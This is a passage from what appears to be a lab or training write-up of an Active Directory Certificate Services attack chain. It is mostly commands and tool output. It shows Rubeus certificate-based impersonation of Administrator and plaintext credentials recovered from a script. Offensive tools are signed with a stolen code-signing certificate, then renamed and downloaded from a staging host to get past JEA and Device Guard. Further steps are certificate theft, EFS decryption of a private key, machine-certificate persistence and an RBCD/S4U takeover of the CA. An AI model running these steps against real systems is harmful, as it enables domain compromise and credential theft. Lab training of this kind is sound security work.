[*] Subject                 : CN=protecteduser, CN=Users, DC=protectedcb, DC=corp
[*] AltName                 : Administrator
[*] SidExtension            : S-1-5-21-1286082170-882298176-404569034-500

[*] Certificate Authority   : cbp-dc.protectedcb.corp\CBP-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 36

<snip>
```

- We can now request a TGT for `protectedcb\administrator` in order to impersonate the account and access the Domain Controller.
```powershell
PS C:\ADCS\Auditor> .\Rubeus.exe asktgt /user:Administrator /certificate:C:\ADCS\Auditor\Loot\protectedcb_ea.pfx /domain:protectedcb.corp /dc:cbp-dc.protectedcb.corp /nowrap /ptt /getcredentials

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=protecteduser, CN=Users, DC=protectedcb, DC=corp
[*] Building AS-REQ (w/ PKINIT preauth) for: 'protectedcb.corp\Administrator'
[*] Using domain controller: 172.22.87.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

<snip>

[+] Ticket successfully imported!

<snip>

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 6EA4AB71E53F847BDF739C95CA24ECD0
```

```powershell
PS C:\ADCS\Auditor> winrs -r:cbp-dc.protectedcb.corp powershell.exe
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\Administrator> hostname
hostname
cbp-dc
PS C:\Users\Administrator> whoami
whoami
protectedcb\administrator
```

## `certbulk.cb.corp` Continued ##
### **CB-SIGNSRV** ###
#### Exploitation ####
- Another important aspect in AD auditing it so constantly be on the lookout for file shares that might become accessible when we compromise new domain accounts.
- In this case, we should see if `certbulk\studentadmin` or `cb\certstore` can access some interesting file shares. We will enumerate after we impersonate those users.
```powershell
PS C:\ADCS\Auditor> .\SharpShares.exe /domain:certbulk.cb.corp /ldap:all /filter:sysvol,netlogon,ipc$,print$
[+] Parsed Arguments:
        filter: none
        filter: SYSVOL,NETLOGON,IPC$,PRINT$
        dc:
        domain: certbulk.cb.corp
        ldap: all
        ou:
        stealth: False
        threads: 25
        verbose: False
        outfile: none
[*] Excluding SYSVOL,NETLOGON,IPC$,PRINT$ shares
[*] Starting share enumeration with thread limit of 25
[r] = Readable Share
[w] = Writeable Share
[-] = Unauthorized Share (requires /verbose flag)
[?] = Unchecked Share (requires /stealth flag)

[+] Performing LDAP query against Global Catalog for all enabled computers with "primary" group "Domain Computers"...
[+] This may take some time depending on the size of the environment
[+] LDAP Search Results: 25
Status: (0.00%) 0 computers finished (+0) -- Using 21 MB RAM
[+] Starting share enumeration against 25 hosts

[r] \\CB-WEBAPP1.CERTBULK.CB.CORP\ADMIN$
[r] \\CB-WEBAPP1.CERTBULK.CB.CORP\C$
[w] \\CB-WEBAPP1.CERTBULK.CB.CORP\ADMIN$
[w] \\CB-WEBAPP1.CERTBULK.CB.CORP\C$
[r] \\CB-DC.CERTBULK.CB.CORP\CodeSigningTools
[w] \\CB-DC.CERTBULK.CB.CORP\CodeSigningTools
[r] \\CB-CA.CB.CORP\CertEnroll
[w] \\CB-CA.CB.CORP\CertEnroll

<snip>

[+] Finished Enumerating Shares
```

- The _CodeSigningTools_ file share looks interesting. Let's further enumerate it.
```powershell
PS C:\ADCS\Auditor> dir \\CB-DC.CERTBULK.CB.CORP\CodeSigningTools


    Directory: \\CB-DC.CERTBULK.CB.CORP\CodeSigningTools


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/22/2023   8:46 AM           3860 SecureSigner.pem
-a----         6/23/2023   7:38 AM           1081 TestCredSSPandJEA.ps1
```

- Let's transfer these files to **CB-WS33** to investigate them.
```powershell
PS C:\ADCS\Auditor> type .\Loot\TestCredSSPandJEA.ps1
# Script to test JEA and CredSSP authentication for valid Code Signed Execution with WDAC
## Create Credential Object
$password = ConvertTo-SecureString 'IW!LLAdministerStud3nts!' -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential('certbulk\studentadmin', $password)

# Members of VaultUsers group can connect to the CosdeSigning JEA endpoint to sign their tools
## Create PSRemote session with CredSSP and connect to the restricted CodeSigning JEA endpoint
$session = New-PSSession -cn cb-signsrv.certbulk.cb.corp -Credential $credential -Authentication Credssp -ConfigurationName CodeSigning
## Execute allowed Invoke-Webrequest commandlet (in JEA config) for signtool download onto cb-signsrv
Invoke-Command -Session $session -ScriptBlock { Invoke-WebRequest -Uri https://cb-webapp1.certbulk.cb.corp/signtool.exe -OutFile C:\CodeSigning\signtool.exe }
## Test code signing functionality
Invoke-Command -Session $session -ScriptBlock { C:\CodeSigning\signtool.exe sign /fd SHA256 /a /f SecureSigner.pfx /p "IW!LLAdministerStud3nts!" test.exe }
```
-> Just Enough Administration (JEA) is a security technology that enables delegated administration for anything managed by PowerShell. With JEA, we can:
	- **Reduce the number of administrators on your machines** using virtual accounts or group-managed service accounts to perform privileged actions on behalf of regular users.
	- **Limit what users can do** by specifying which cmdlets, functions, and external commands they can run.
	- **Better understand what your users are doing** with transcripts and logs that show us exactly which commands a user executed during their session.
-> The Credential Security Support Provider (**CredSSP**) Protocol enables an application to securely delegate a user's credentials from a client to a target server. For example, the Microsoft Terminal Server uses the CredSSP Protocol to securely delegate the user's password or smart card PIN from the client to the server to remotely log on the user and establish a terminal services session. Some administrators solve the Kerberos double-hop problem with CredSSP, which is a less-secure method.

- Convert the `SecureSigner.pem` to a `.pfx` format to investigate it using **certutil**.
```powershell
PS C:\ADCS\Auditor> certutil -dump .\Loot\SecureSigner.pfx
Enter PFX password:
================ Certificate 0 ================
================ Begin Nesting Level 1 ================
Element 0:
Serial Number: 3000000028361fa61e9fd9b691000000000028
Issuer: CN=CB-CA, DC=cb, DC=corp
 NotBefore: 4/20/2023 1:56 AM
 NotAfter: 4/19/2024 1:56 AM
Subject: CN=signadmin, CN=Users, DC=certbulk, DC=cb, DC=corp
Non-root Certificate
Template: SecureSigner, Secure Signer
Cert Hash(sha1): 322826c6abb2f04c389c78d163d5435aa0df5913
----------------  End Nesting Level 1  ----------------
  Provider = Microsoft Enhanced Cryptographic Provider v1.0
Encryption test passed
CertUtil: -dump command completed successfully.
```
-> We can see that this certificate is used for secure signing.
-> These digital certificates are marked for the specific use of digitally signed code.
-> Code signing identifies that the software or application is coming from a specific source (a developer or signer).
-> When a digital signature is applied, a timestamp is also recorded. This timestamping feature acts to ensure the signed code remains valid even after the digital certificate expires.

- Let's try to retrieve the **signtool.exe** to **CB-WS33**.
- According to Microsoft, SignTool is a command-line tool that digitally signs files, verifies the signatures in files, and time stamps files.
- Let's try to digitally sign one of our offensive tools using **signtool** and the _SecureSigner_ certificate.
```powershell
PS C:\ADCS\Auditor> wget https://cb-webapp1.certbulk.cb.corp/signtool.exe -OutFile .\signtool.exe
PS C:\ADCS\Auditor> mkdir SignedTools


    Directory: C:\ADCS\Auditor


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/19/2023   6:56 AM                SignedTools


PS C:\ADCS\Auditor> cd .\SignedTools\
PS C:\ADCS\Auditor\SignedTools> cp ..\Rubeus.exe .
PS C:\ADCS\Auditor\SignedTools> ..\signtool.exe sign /fd SHA256 /a /f ..\Loot\SecureSigner.pfx /p "IW!LLAdministerStud3nts!" Rubeus.exe
SignTool Error: The specified PFX password is not correct.
PS C:\ADCS\Auditor\SignedTools> ..\signtool.exe sign /fd SHA256 /a /f ..\Loot\SecureSigner.pfx .\Rubeus.exe
Done Adding Additional Store
Successfully signed: .\Rubeus.exe
```
-> We have successfully signed **Rubeus**. This will probably allow us to run executable files in **CB-SIGNSRV** where JEA is enabled.

- Let's try to obtain a remote connection to **CB-SIGNSRV** using the PowerShell script instructions.
```powershell
PS C:\ADCS\Auditor\SignedTools> $studentadminpassword = ConvertTo-SecureString 'IW!LLAdministerStud3nts!' -AsPlainText -Force
PS C:\ADCS\Auditor\SignedTools> $studentadmincredentials = New-Object System.Management.Automation.PSCredential('certbulk\studentadmin', $studentadminpassword)
PS C:\ADCS\Auditor\SignedTools> Invoke-Command -ComputerName cb-signsrv.certbulk.cb.corp -Credential $studentadmincredentials -ScriptBlock {hostname}
[cb-signsrv.certbulk.cb.corp] Connecting to remote server cb-signsrv.certbulk.cb.corp failed with
the following error message : Access is denied. For more information, see the
about_Remote_Troubleshooting Help topic.
    + CategoryInfo          : OpenError: (cb-signsrv.certbulk.cb.corp:String) [], PSRemotingTrans
   portException
    + FullyQualifiedErrorId : AccessDenied,PSSessionStateBroken
PS C:\ADCS\Auditor\SignedTools> $signsrvsession = New-PSSession -cn cb-signsrv.certbulk.cb.corp -Credential $studentadmincredentials -Authentication Credssp -ConfigurationName CodeSigning
PS C:\ADCS\Auditor\SignedTools> Invoke-Command -Session $signsrvsession -ScriptBlock {whoami}
The term 'whoami.exe' is not recognized as the name of a cmdlet, function, script file, or
operable program. Check the spelling of the name, or if a path was included, verify that the path
is correct and try again.
    + CategoryInfo          : ObjectNotFound: (whoami.exe:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
    + PSComputerName        : cb-signsrv.certbulk.cb.corp
```

- Let's see what cmdlets are allowed for execution.
```powershell
PS C:\ADCS\Auditor\SignedTools> Invoke-Command -Session $signsrvsession -ScriptBlock {Get-Command}

CommandType     Name                                               Version    Source     PSCompute
                                                                                         rName
-----------     ----                                               -------    ------     ---------
Function        Clear-Host                                                               cb-sig...
Function        Exit-PSSession                                                           cb-sig...
Function        Get-Command                                                              cb-sig...
Function        Get-FormatData                                                           cb-sig...
Function        Get-Help                                                                 cb-sig...
Function        Invoke-WebRequest                                                        cb-sig...
Function        Measure-Object                                                           cb-sig...
Function        Out-Default                                                              cb-sig...
Function        Select-Object                                                            cb-sig...
```

- Let's host this file to **HFS** and try to transfer it to **CB-SIGNSRV**.
```powershell
PS C:\ADCS\Auditor\SignedTools> Enter-PSSession -Session $signsrvsession
[cb-signsrv.certbulk.cb.corp]: PS>Invoke-WebRequest -Uri http://172.16.100.33/Rubeus.exe -OutFile C:\CodeSigning\Rubeus.exe                                                                           [cb-signsrv.certbulk.cb.corp]: PS>
[cb-signsrv.certbulk.cb.corp]: PS>C:\CodeSigning\Rubeus.exe triage
The term 'C:\CodeSigning\Rubeus.exe' is not recognized as the name of a cmdlet, function, script
file, or operable program. Check the spelling of the name, or if a path was included, verify that
the path is correct and try again.
    + CategoryInfo          : ObjectNotFound: (C:\CodeSigning\Rubeus.exe:String) [], CommandNotFo
   undException
    + FullyQualifiedErrorId : CommandNotFoundException
```

- The execution fails, although this is a signed executable. Per the instructions of the PowerShell script, **signtool.exe** is allowed for execution. Let's try to rename **Rubeus.exe** to **signtool.exe**.
```powershell
PS C:\ADCS\Auditor\FakeSign> Enter-PSSession -Session $signsrvsession
[cb-signsrv.certbulk.cb.corp]: PS> Invoke-WebRequest -Uri http://172.16.100.33/signtool.exe -OutFile C:\CodeSigning\signtool.exe
[cb-signsrv.certbulk.cb.corp]: PS>C:\CodeSigning\signtool.exe triage

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1


Action: Triage Kerberos Tickets (Current User)

[*] Current LUID    : 0x515ab6

 -----------------------------------------------------------------------------------------------
 | LUID     | UserName                        | Service                 | EndTime              |
 -----------------------------------------------------------------------------------------------
 | 0x515ab6 | studentadmin @ CERTBULK.CB.CORP | krbtgt/CERTBULK.CB.CORP | 9/11/2023 6:43:13 PM |
 -----------------------------------------------------------------------------------------------
<snip>
```

- We can see that now Rubeus gets executed normally.
- It seems that we can not dump all the tickets from the machine, because of JEA.
- Let's try to use another tool `CertifyKit`, to list certificates.
```powershell
PS C:\ADCS\Auditor\FakeSign> Enter-PSSession -Session $signsrvsession
[cb-signsrv.certbulk.cb.corp]: PS> Invoke-WebRequest -Uri http://172.16.100.33/signtool.exe -OutFile C:\CodeSigning\signtool.exe
[cb-signsrv.certbulk.cb.corp]: PS> C:\CodeSigning\signtool.exe list
CertifyKit (Hagrid29 version of Certify)
More info: https://github.com/Hagrid29/CertifyKit/

[*] Action: List Certificates

  Location           : My, CurrentUser
  Issuer             : CN=CB-CA, DC=cb, DC=corp
  HasPrivateKey      : True
  KeyExportable      : True
  Thumbprint         : 457D78CAEDB12A7C254D1DCE5B934F76FDAA679F
  EnhancedKeyUsages  :
       Encrypting File System
       Secure Email
       Client Authentication     [!] Certificate can be used for client authentication!
  SubjectAltName     :
        Other Name:
     Principal Name=signadmin@certbulk.cb.corp

<snip>
```

- Let's dump the certificate using [[THEFT1]]. We are going to output it to base64 because we can not exfiltrate it by other means, because of JEA restrictions.
```powershell
[cb-signsrv.certbulk.cb.corp]: PS> C:\CodeSigning\signtool.exe list /certificate:457D78CAEDB12A7C254D1DCE5B934F76FDAA679F /base64
CertifyKit (Hagrid29 version of Certify)
More info: https://github.com/Hagrid29/CertifyKit/

[*] Action: List Certificates

[*] Base64 encoded certificate:
MIINJgIBAzCCDOI...

<snip>
```

- With this certificate, after we base64 decode it to retrieve the original `.pem` file and then convert that to `.pfx` format we will be able to impersonate `certbulk\signadmin`.
```powershell
PS C:\ADCS\Auditor> .\Rubeus.exe asktgt /user:signadmin /certificate:C:\ADCS\Auditor\Loot\signadmin.pfx /domain:certbulk.cb.corp /dc:cb-dc.certbulk.cb.corp /nowrap /ptt /getcredentials

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=signadmin, CN=Users, DC=certbulk, DC=cb, DC=corp
[*] Building AS-REQ (w/ PKINIT preauth) for: 'certbulk.cb.corp\signadmin'
[*] Using domain controller: 172.16.67.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

<snip>

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 7570CD7C64AC833A7A319003C37340E1
```

- We can now access **CB-SIGNSRV** without the JEA restrictions.
```powershell
PS C:\ADCS\Auditor> winrs -r:cb-signsrv.certbulk.cb.corp powershell.exe
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\signadmin>
```

#### Post-Exploitation ####
- We will now start pillaging credentials/tokens from the compromised web server. We will transfer **Mimikatz**, **Rubeus** and **CertifyKit** to perform our post-exploitation TTPs.
-> **Credential Harvesting**
```powershell
PS C:\Windows\Tasks> .\Rubeus.exe triage
.\Rubeus.exe triage
Program 'Rubeus.exe' failed to run: Your organization used Device Guard to block this app. Contact your support person
PS C:\Windows\Tasks> for more infoAt line:1 char:1
+ .\Rubeus.exe triage
+ ~~~~~~~~~~~~~~~~~~~.
At line:1 char:1
+ .\Rubeus.exe triage
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```

- It seems that Device Guard does not allow us to run our tools in this server. Let's try to digitally sign our offensive tools before transfering the to the target server.
```powershell
PS C:\Users\signadmin\EncryptedFiles> .\Rubeus.exe triage
.\Rubeus.exe triage

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2


Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x280b1c

 --------------------------------------------------------------------------------------------------------------------
 | LUID     | UserName                       | Service                                      | EndTime               |
 --------------------------------------------------------------------------------------------------------------------
 | 0x30e0d7 | signadmin @ CERTBULK.CB.CORP   | HTTP/cb-signsrv.certbulk.cb.corp             | 9/21/2023 10:04:30 AM |
 | 0x2eaee3 | student33 @ CERTBULK.CB.CORP   | cifs/cb-signsrv.certbulk.cb.corp             | 9/21/2023 10:02:38 AM |
 | 0x280b1c | signadmin @ CERTBULK.CB.CORP   | HTTP/cb-signsrv.certbulk.cb.corp             | 9/21/2023 10:04:30 AM |
 | 0x3e4    | cb-signsrv$ @ CERTBULK.CB.CORP | krbtgt/CERTBULK.CB.CORP                      | 9/21/2023 7:02:41 AM  |
 | 0x3e4    | cb-signsrv$ @ CERTBULK.CB.CORP | cifs/cb-dc.certbulk.cb.corp                  | 9/21/2023 7:02:41 AM  |
 | 0x3e4    | cb-signsrv$ @ CERTBULK.CB.CORP | ldap/cb-dc.certbulk.cb.corp/certbulk.cb.corp | 9/21/2023 7:02:41 AM  |
 | 0x28ce10 | signadmin @ CERTBULK.CB.CORP   | HTTP/cb-signsrv.certbulk.cb.corp             | 9/21/2023 10:04:30 AM |
 | 0x3e7    | cb-signsrv$ @ CERTBULK.CB.CORP | krbtgt/CERTBULK.CB.CORP                      | 9/21/2023 7:02:41 AM  |
 | 0x3e7    | cb-signsrv$ @ CERTBULK.CB.CORP | cifs/cb-dc                                   | 9/21/2023 7:02:41 AM  |
 | 0x3e7    | cb-signsrv$ @ CERTBULK.CB.CORP | cifs/cb-dc.certbulk.cb.corp/certbulk.cb.corp | 9/21/2023 7:02:41 AM  |
 | 0x3e7    | cb-signsrv$ @ CERTBULK.CB.CORP | CB-SIGNSRV$                                  | 9/21/2023 7:02:41 AM  |
 | 0x3e7    | cb-signsrv$ @ CERTBULK.CB.CORP | LDAP/cb-dc.certbulk.cb.corp                  | 9/21/2023 7:02:41 AM  |
 | 0x3e7    | cb-signsrv$ @ CERTBULK.CB.CORP | ldap/cb-dc.certbulk.cb.corp/certbulk.cb.corp | 9/21/2023 7:02:41 AM  |
 --------------------------------------------------------------------------------------------------------------------
```

- We can see that currently

-> **Token Harvesting**
- We have already performed [[THEFT1]] to exfiltrate a certificate for `certbulk\signadmin`.
- Let's attempt to perform [[THEFT4]] via PowerShell.
```powershell
PS C:\CodeSigning> Get-ChildItem -Recurse -Path C:\ -Include *.pfx, *.pem, *.p12, *.crt, *.cer, *.p7b -ErrorAction SilentlyContinue -Force
Get-ChildItem -Recurse -Path C:\ -Include *.pfx, *.pem, *.p12, *.crt, *.cer, *.p7b -ErrorAction SilentlyContinue -Force


    Directory: C:\Documents and Settings\signadmin\EncryptedFiles


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/20/2023   5:40 AM           3844 mgmtadmin.pem
-a----         4/20/2023   4:20 AM           3283 signadmin.pfx

<snip>
```

- We have 2 new certificates. One of them has the same name with the one we exfiltrated using [[THEFT1]]. However, since that certificate was in a Certificate Store and this one is placed on the file system, we should inspect both to see if they are the same certificates or different ones.
- Let's investigate both certificates to our file system.
```powershell
PS C:\Users\signadmin\EncryptedFiles> type mgmtadmin.pem
type mgmtadmin.pem
type : Access to the path 'C:\Users\signadmin\EncryptedFiles\mgmtadmin.pem' is denied.
PS C:\Users\signadmin\EncryptedFiles> At line:1 char:1
+ type mgmtadmin.pem
+ ~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\signad...s\mgmtadmin.pem:String) [Get-Content], Unauthorized
   AccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand

PS C:\Users\signadmin\EncryptedFiles> certutil -dump .\signadmin.pfx
certutil -dump .\signadmin.pfx
Program 'certutil.exe' failed to run: Your organization used Device Guard to block this app. Contact your support
PS C:\Users\signadmin\EncryptedFiles> person for more infoAt line:1 char:1
+ certutil -dump .\signadmin.pfx
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
At line:1 char:1
+ certutil -dump .\signadmin.pfx
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```

-> The errors we get are very interesting. We do NOT have access to `mgmtadmin.pem`, since we get a _PermissionDenied_ error. This error does not seem to be the case with `signadmin.pfx`, however **certutil** is blocked by the Device Guard.

- Since we can execute our offensive tools on the server, provided we have digitally singed them first, let's try to sign **CertifyKit**, transfer and use it. 
```powershell
PS C:\ADCS\Auditor> cd .\SignedTools\
PS C:\ADCS\Auditor\SignedTools> cp ..\CertifyKit.exe .
PS C:\ADCS\Auditor\SignedTools> ..\signtool.exe sign /fd SHA256 /a /f ..\Loot\SecureSigner.pfx /p "IW!LLAdministerStud3nts!" CertifyKit.exe
SignTool Error: The specified PFX password is not correct.
PS C:\ADCS\Auditor\SignedTools> ..\signtool.exe sign /fd SHA256 /a /f ..\Loot\SecureSigner.pfx CertifyKit.exe
Done Adding Additional Store
Successfully signed: CertifyKit.exe
```

- Let's try to read the `signadmin.pfx` certificate.
```powershell
PS C:\Users\signadmin\EncryptedFiles> .\CertifyKit.exe list /certificate:C:\Users\signadmin\EncryptedFiles\signadmin.pfx
.\CertifyKit.exe list /certificate:C:\Users\signadmin\EncryptedFiles\signadmin.pfx
CertifyKit (Hagrid29 version of Certify)
More info: https://github.com/Hagrid29/CertifyKit/

[*] Action: List Certificates

  Location           : C:\Users\signadmin\EncryptedFiles\signadmin.pfx
  Issuer             : CN=CB-CA, DC=cb, DC=corp
  Subject            : CN=signadmin, CN=Users, DC=certbulk, DC=cb, DC=corp
  ValidDate          : 4/20/2023 4:03:06 AM
  ExpiryDate         : 4/19/2024 4:03:06 AM
  HasPrivateKey      : True
  KeyExportable      : True
  Thumbprint         : 0CB7AF88D42DA64A7D12DEB45BCDBD0112655F05
  Serial Number      : 300000002B7B21966A7912AA4300000000002B
  Template           : User
  EnhancedKeyUsages  :
       Encrypting File System
       Secure Email
       Client Authentication     [!] Certificate can be used for client authentication!
  SubjectAltName     :
        Other Name:
     Principal Name=signadmin@certbulk.cb.corp





CertifyKit completed in 00:00:00.1953864
```

- If we compare it with the certificate we already have, we will realize that the thumbprints are completely different.
- Since this new certificate can be used for _Encrypting File System_, we should try to import it and see if we can read `mgmtadmin.pem`.
```powershell
PS C:\Users\signadmin\EncryptedFiles> .\CertifyKit.exe list /certificate:C:\Users\signadmin\EncryptedFiles\signadmin.pfx /storename:My /install
.\CertifyKit.exe list /certificate:C:\Users\signadmin\EncryptedFiles\signadmin.pfx /storename:My /install
CertifyKit (Hagrid29 version of Certify)
More info: https://github.com/Hagrid29/CertifyKit/

[*] Action: List Certificates

[*] Certificate installed!


CertifyKit completed in 00:00:00.0985079
PS C:\Users\signadmin\EncryptedFiles> type .\mgmtadmin.pem
type .\mgmtadmin.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAxzJ9vid3pq3XAGWLpw2sBMKJNj+WehSCsbXJ6Bhg5tuyE1bi
4H6aHHtQwwYUdMBgrlMRFMhz0XMppdiJ4q+8uQNLNxUMBfqzmo0grPVS0AazQAzi

<snip>
```

- We can now convert this exfiltrated certificate to a `.pfx` one and use it to impersonate `cb\mgmtadmin`.
- Before we leave the server, we should request a machine certificate for long-term persistence.
```powershell
PS C:\Users\signadmin\EncryptedFiles> .\CertifyKit.exe request /machine /template:Machine /ca:cb-ca.cb.corp\cb-ca
.\CertifyKit.exe request /machine /template:Machine /ca:cb-ca.cb.corp\cb-ca
CertifyKit (Hagrid29 version of Certify)
More info: https://github.com/Hagrid29/CertifyKit/

[*] Action: Request a Certificates
[*] Elevating to SYSTEM context for machine cert request

[*] Current user context    : NT AUTHORITY\SYSTEM
[*] No subject name specified, using current machine as subject

[*] Template                : Machine
[*] Subject                 : CN=cb-signsrv.certbulk.cb.corp

[*] Certificate Authority   : cb-ca.cb.corp\cb-ca

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 61

[*] cert.pem         :

<snip>
```

### Enumerating access rights of `certbulk\cb-signsrv`, `certbulk\signadmin` and `cb\mgmtadmin` ###
- Since we now have access to 3 new domain accounts, we should use **BloodHound** to see if we have any new interesting permissions.
- `cb\mgmtadmin` has _GenericWrite_ permissions over **CB-CA**. This means that we can perform a takeover of that server which is the Enterprise DC/CA.
### Enterprise Privilege Escalation abusing ADCS ###
#### Exploitation ####
- We have 2 ways to abuse the `GenericWrite` permissions.
	- Perform a RBCD attack.
	- Perform a Shadow Credentials attack.

- Let's start by impersonating `cb\mgmtadmin` using the exfiltrated certificate.
```powershell
PS C:\ADCS\Auditor> .\Rubeus.exe asktgt /user:mgmtadmin /certificate:C:\ADCS\Auditor\Loot\mgmtadmin.pfx /domain:cb.corp /dc:cb-ca.cb.corp /nowrap /ptt /getcredentials

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=mgmtadmin, CN=Users, DC=cb, DC=corp
[*] Building AS-REQ (w/ PKINIT preauth) for: 'cb.corp\mgmtadmin'
[*] Using domain controller: 172.16.10.1:88
[+] TGT request successful!

<snip>

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 31C3B7414BE8E75638AC755A23D754FE
```
##### RBCD Attack ####
- In this attack, we can add a new machine on the `cb.corp` parent domain.
- This is not stealthy, since `CB-CA` is the only server in the domain so adding a new computer will be easily detected.
- We can not use `Powermad` because it does not allow us to add a computer to a **different** domain than the one we are currently at.
- We will use `SharpAllowedToAct` instead.
```powershell
PS C:\ADCS\Auditor> .\SharpAllowedToAct.exe -m CB-BACKUPSRV -P 'Password123!' -t CB-CA -a CB-CA.CB.CORP -d cb.corp
[+] Domain = cb.corp
[+] Domain Controller = CB-CA.CB.CORP
[+] New SAMAccountName = CB-BACKUPSRV$
[+] Distinguished Name = CN=CB-BACKUPSRV,CN=Computers,DC=cb,DC=corp
[+] Machine account CB-BACKUPSRV added
[+] SID of New Computer: S-1-5-21-2928296033-1822922359-262865665-12601
[+] Attribute changed successfully
[+] Done!
```

- We have now modified the `msds-allowedtoactonbehalfofotheridentity` attribute of the target machine,
- We can use Rubeus (`S4U` module) to request a TGS for the service name we want to pretend to have administrative privileges for.
- First we need to find the `rc4` hash of the password we have set to the created computer.
```powershell
PS C:\ADCS\Auditor> .\Rubeus.exe hash /user:cb-backupsrv$ /domain:cb.corp /password:Password123!

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2


[*] Action: Calculate Password Hash(es)

[*] Input password             : Password123!
[*] Input username             : cb-backupsrv$
[*] Input domain               : cb.corp
[*] Salt                       : CB.CORPhostcb-backupsrv.cb.corp
[*]       rc4_hmac             : 2B576ACBE6BCFDA7294D6BD18041B8FE
[*]       aes128_cts_hmac_sha1 : BB150EB2531FD562CF88EE868AA773AF
[*]       aes256_cts_hmac_sha1 : 6C129F4EB572962054991150A84A84F7C1756842CC2FAFF387A21E85C05D5DF3
[*]       des_cbc_md5          : 70E357328CC246AD

PS C:\ADCS\Auditor> .\Rubeus.exe s4u /user:cb-backupsrv$ /rc4:2B576ACBE6BCFDA7294D6BD18041B8FE /impersonateuser:Administrator /msdsspn:http/cb-ca.cb.corp /nowrap /ptt /dc:cb-ca.cb.corp /domain:cb.corp

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: S4U

[*] Using rc4_hmac hash: 2B576ACBE6BCFDA7294D6BD18041B8FE
[*] Building AS-REQ (w/ preauth) for: 'cb.corp\cb-backupsrv$'
[*] Using domain controller: 172.16.10.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

<snip>

[*] Action: S4U

[*] Building S4U2self request for: 'cb-backupsrv$@CB.CORP'
[*] Using domain controller: cb-ca.cb.corp (172.16.10.1)
[*] Sending S4U2self request to 172.16.10.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'cb-backupsrv$@CB.CORP'
[*] base64(ticket.kirbi):

 <snip>

[*] Impersonating user 'Administrator' to target SPN 'http/cb-ca.cb.corp'
[*] Building S4U2proxy request for service: 'http/cb-ca.cb.corp'
[*] Using domain controller: cb-ca.cb.corp (172.16.10.1)
[*] Sending S4U2proxy request to domain controller 172.16.10.1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'http/cb-ca.cb.corp':

<snip>
```

- Now we can access `CB-CA` with EA privileges.
```powershell
PS C:\ADCS\Auditor> winrs -r:cb-ca.cb.corp powershell.exe
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\Administrator.CB-CA> hostname;whoami
hostname;whoami
cb-ca
cb\administrator
```

##### Shadow Credentials Attack ####
- This attack is way more stealthy and also easier to execute.
